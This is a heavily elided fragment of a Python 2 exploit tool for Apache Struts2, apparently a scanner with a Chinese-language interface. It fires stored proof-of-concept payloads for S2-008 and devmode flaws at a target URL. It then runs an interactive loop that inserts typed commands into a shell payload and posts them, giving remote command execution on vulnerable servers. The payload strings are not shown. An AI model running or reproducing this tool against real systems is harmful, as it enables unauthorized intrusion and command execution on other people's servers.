...
|____/ \__|_|   \__,_|\__|___/    |____/ \___\__,_|_| |_|
        ...
        try:
            ...
            self.check("struts2-008-1".encode('gbk'), req.text)
        except Exception as e:
            cprint("检测struts2-008-1超时..".encode('gbk'), "cyan")
            print "超时原因: ", e

        try:
            req = requests.get(self.url+self.poc['ST2-008-2'], headers=headers,  timeout=TMOUT, verify=False)
            self.check("struts2-008-2".encode('gbk'), req.text)
        except Exception as e:
            cprint("检测struts2-008-2超时..".encode('gbk'), "cyan")
            print "超时原因: ".encode('gbk'), e
        ...
        try:
            req = requests.post(self.url, headers=headers, data=self.poc['ST2-devmode-post'], timeout=TMOUT, verify=False)
            ...
            while True:
                ...
                if command != "exit":
                    try:
                        ...
                        print req.text
                        req = requests.post(self.url, data=self.shell['struts2-devmode-post'].replace("FUZZINGCOMMAND", command), headers=headers, timeout=TMOUT, verify=False)
                        if req.encoding == 'UTF-8':
                            try:
                                #处理req--->unicode
                                #req.encoding='utf-8'
